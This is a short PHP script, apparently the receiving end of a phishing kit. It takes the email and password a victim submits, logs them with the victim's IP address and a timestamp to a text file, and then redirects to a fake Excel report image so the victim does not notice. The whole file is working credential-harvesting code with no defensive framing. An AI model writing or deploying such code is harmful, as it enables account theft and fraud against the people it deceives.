<?php
$username = $_POST['Email'];
$password = $_POST['Password'];
$ip=$_SERVER["REMOTE_ADDR"];
$date = date("m/d/y G.i:s", time());

$filename = 'names.txt';
$fp = fopen("$filename", "a");

$mesNamePass = "----------------------\n";
$mesNamePass .= "Name: ".$username."\n";
$mesNamePass .= "Pass: ".$password."\n";
$mesNamePass .= "IP:   ".$ip."\n";
$mesNamePass .= "Date: ".$date."\n\n";
$write = fwrite($fp, $mesNamePass);
fclose($fp);

header("Location: http://127.0.0.1/excel/console-report-xls.jpg");
exit();

?>
